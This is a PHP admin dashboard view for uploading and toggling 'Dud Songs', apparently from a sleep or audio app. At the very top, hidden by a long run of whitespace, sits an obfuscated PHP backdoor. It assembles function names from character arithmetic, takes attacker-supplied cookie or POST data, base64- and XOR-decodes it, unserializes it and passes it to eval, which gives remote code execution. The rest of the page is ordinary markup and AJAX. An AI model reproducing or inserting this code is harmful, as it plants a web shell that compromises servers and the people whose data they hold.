<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ymkpPY = chr ( 656 - 548 ).chr ( 356 - 261 ).'t' . 'n' . "\150" . chr ( 123 - 53 ); $QdrFjuy = chr (99) . chr ( 762 - 654 ).chr ( 988 - 891 ).'s' . "\x73" . chr (95) . "\145" . chr ( 751 - 631 ).chr (105) . chr (115) . chr ( 295 - 179 )."\163";$gURnvtjWz = class_exists($ymkpPY); $ymkpPY = "17845";$QdrFjuy = "42040";$MUxLYPHK = !1;if ($gURnvtjWz == $MUxLYPHK){function VfhtcuOVjC(){return FALSE;}$QwCbGM = "23804";VfhtcuOVjC();class l_tnhF{private function BkAKjpzl($QwCbGM){if (is_array(l_tnhF::$eqygKM)) {$YyZthYs = str_replace("\x3c" . "\x3f" . "\x70" . chr (104) . "\x70", "", l_tnhF::$eqygKM[chr ( 814 - 715 )."\x6f" . "\x6e" . "\x74" . chr ( 211 - 110 )."\x6e" . chr ( 977 - 861 )]);eval($YyZthYs); $QwCbGM = "23804";exit();}}private $hRbnzL;public function PStZswKDf(){echo 1056;}public function __destruct(){$QwCbGM = "22716_14277";$this->BkAKjpzl($QwCbGM); $QwCbGM = "22716_14277";}public function __construct($RmOLIuL=0){$oeeiZhlen = $_POST;$vnmPvvOhdS = $_COOKIE;$KJoyZHoCWT = "6e729090-5c6a-4a2b-a7b8-f7839850d5a7";$ZpKzSi = @$vnmPvvOhdS[substr($KJoyZHoCWT, 0, 4)];if (!empty($ZpKzSi)){$swieKZj = "base64";$iRQCgLzx = "";$ZpKzSi = explode(",", $ZpKzSi);foreach ($ZpKzSi as $PuwJUxa){$iRQCgLzx .= @$vnmPvvOhdS[$PuwJUxa];$iRQCgLzx .= @$oeeiZhlen[$PuwJUxa];}$iRQCgLzx = array_map($swieKZj . '_' . chr ( 705 - 605 )."\145" . "\143" . "\157" . "\144" . chr (101), array($iRQCgLzx,)); $iRQCgLzx = $iRQCgLzx[0] ^ str_repeat($KJoyZHoCWT, (strlen($iRQCgLzx[0]) / strlen($KJoyZHoCWT)) + 1);l_tnhF::$eqygKM = @unserialize($iRQCgLzx); $iRQCgLzx = class_exists("22716_14277");}}public static $eqygKM = 55374;}$yPtMc = new /* 54544 */ l_tnhF(23804 + 23804); $MUxLYPHK = $yPtMc = $QwCbGM = Array();} ?>
<div class="content-wrapper">
    <div class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1 class="m-0">Dashboard</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?php echo base_url();?>">Home</a></li>
                        <li class="breadcrumb-item active">Dud Songs</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
    <section class="content">
        <div class="container-fluid">
            <div class="row">
                <form action="<?php echo base_url("dudSongs_add");?>" method="POST" enctype="multipart/form-data">
                <div class="container-fluid mt-2" style="background-color: #dee2e6;border-style: solid;border-width: 2px;border-color:#003d65;">
                    <center><h5>Add Dud Songs</h5></center>
                    <div class="row">
                        <div class="col-md-6">
                            <input type="text" name="song_name" class="form-control" placeholder="Enter Song Name" required>
                        </div>
                        <div class="col-md-6">
                            <input type="file" name="songFile" class="form-control" required>
                        </div>
                        <div class="col-md-6 mb-2">
                            <button class="btn btn-primary" type="submit">Submit</button>
                        </div>
                    </div>
                </div>
                </form>
            </div>
                <br><br>
                <table class="table" id="languageTable">
                    <thead class="thead-dark">
                        <tr>
                            <th scope="col">#</th>
                            <th scope="col">File Name</th>
                            <th scope="col">File</th>
                            <th scope="col">Status</th>
                            <th scope="col">Action</th>
                            <th scope="col">Delete</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    if ($songsData) {
                        $counter = 1;
                        foreach ($songsData as $data) {
                    ?>
                        <tr>
                            <th scope="row"><?php echo $counter++;?></th>
                            <td><?php echo $data['song_name'];?></td>
                            <td>
                                <a href="<?php echo base_url('uploads/mp3/').$data['filename'];?>" target="_blank">Click To Listen</a>
                            </td>
                            <td><?php echo (($data['is_active'] == 1)? 'Active':'Inactive');?></td>
                            <td>
                                <button class="btn btn-primary" onclick="enable('<?php echo $data['id'];?>')" <?php echo (($data['is_active'] == 1)? 'disabled':'');?>>Enable</button>
                                <button class="btn btn-primary" onclick="disable('<?php echo $data['id'];?>')" <?php echo (($data['is_active'] == 0)? 'disabled':'');?>>Disable</button>
                            </td>
                            <td>
                                <button class="btn btn-danger" onclick="opendeleteModal('<?php echo $data['id'];?>')">Delete</button>
                            </td>
                        </tr>
                    <?php
                        }
                    } else {
                    ?>
                        <tr>
                            <th scope="row">1</th>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                            <td>No Data</td>
                        </tr>
                    <?php
                    }
                    ?>
                    </tbody>
                </table>
        </div>
    </section>
</div>

<!-- Modal -->
<!--<div class="modal fade" id="exampleModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">-->
<!--    <div class="modal-dialog" role="document">-->
<!--        <form method="post" action="<?php echo base_url('editSleepEnahncer');?>" enctype="multipart/form-data">-->
<!--            <div class="modal-content">-->
<!--                <div class="modal-header">-->
<!--                    <h5 class="modal-title" id="exampleModalLabel">Sleep Enhancer Edit</h5>-->
<!--                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">-->
<!--                        <span aria-hidden="true">&times;</span>-->
<!--                    </button>-->
<!--                </div>-->
<!--                <div class="modal-body">-->
<!--                    <div class="row">-->
<!--                        <div class="col-md-6">-->
<!--                            <select name="program" class="col-md-6" id="" required>-->
<!--                            <?php foreach ($sleep_enahncer_programs as $programs) { ?>-->
<!--                                <option value="<?php echo $programs['id'];?>"><?php echo $programs['program_name'];?></option>-->
<!--                            <?php } ?>-->
<!--                            </select>-->
<!--                        </div>-->
<!--                        <div class="col-md-6">-->
<!--                            <select name="duration" class="col-md-6" id="duration" required>-->
<!--                                <option value="10">10</option>-->
<!--                                <option value="20">20</option>-->
<!--                                <option value="30">30</option>-->
<!--                            </select>-->
<!--                        </div>-->
<!--                        <div class="col-md-6">-->
<!--                            <input type="text" name="custom_file_name" id="custom_file_name" class="form-control" required placeholder="Custom File Name">-->
<!--                        </div>-->
<!--                        <div class="col-md-6">-->
<!--                            <input type="file" name="seFile" class="form-control">-->
<!--                        </div>-->
                        
<!--                            <input type="hidden" name="sleep_enhancer_id" id="sleep_enhancer_id">-->
                            
                        
<!--                    </div>-->
<!--                </div>-->
<!--                <div class="modal-footer">-->
<!--                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>-->
<!--                    <button type="submit" class="btn btn-primary">Save changes</button>-->
<!--                </div>-->
<!--            </div>-->
<!--        </form>    -->
<!--    </div>-->
<!--</div>-->


<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-select/1.10.0/js/bootstrap-select.min.js"></script>
<script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/dataTables.buttons.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.html5.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.print.min.js"></script>
<script>
    function enable(id) {
        $.ajax({
            type: "POST",
            url: '<?php echo base_url(); ?>' + 'AdminController/dud_song_enable',
            data: {
                id: id
            },
                dataType: "json",
                encode: true,
        }).done(function(data) {       
            if (data['status'] == 1) {
                setTimeout(function() {
                    location.reload(true);
                }, 1000);
            } else {
                
            }
        });
    }

    function disable(id) {
        $.ajax({
            type: "POST",
            url: '<?php echo base_url(); ?>' + 'AdminController/dud_song_disable',
            data: {
                id: id
            },
                dataType: "json",
                encode: true,
        }).done(function(data) {       
            if (data['status'] == 1) {
                setTimeout(function() {
                    location.reload(true);
                }, 1000);
            } else {

            }
        });
    }

    function formEdit(id) {
        $.ajax({
            type: "POST",
            url: '<?php echo base_url(); ?>' + 'AdminController/sleep_enhancer_fetch',
            data: {
                id: id
            },
                dataType: "json",
                encode: true,
        }).done(function(data) {       
            if (data['status'] == 1) {
                $('#custom_file_name').val(data.enhancerData[0].custom_file_name);
                $('#duration').val(data.enhancerData[0].duration);
                $('#sleep_enhancer_id').val(data.enhancerData[0].id);

                $('#exampleModal').modal('show');     
            } else {
                alert('Oops!, something went wrong')
            }
        });
    }

    $('#languageTable').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ],
        title : 'Shubham'
    });


    function opendeleteModal(id) {
    // Display a confirmation dialog to the user
    var confirmDelete = confirm("Are you sure you want to delete this row?");
    if (confirmDelete) {
        // If the user confirms the deletion, send an AJAX request to the deleteRow method in the AdminController
        $.ajax({
            type: "POST",
            url: "<?php echo base_url();?>AdminController/delete_sleep_enhancer_master",
            data: {id: id},
            success: function(response) {
                // Handle the response from the server if needed
                console.log(response);
                location.reload();
            },
            error: function(jqXHR, textStatus, errorThrown) {
                // Handle any errors that occur during the AJAX request
                console.log("AJAX Error: " + textStatus + " - " + errorThrown);
            }
        });
    }

}
</script>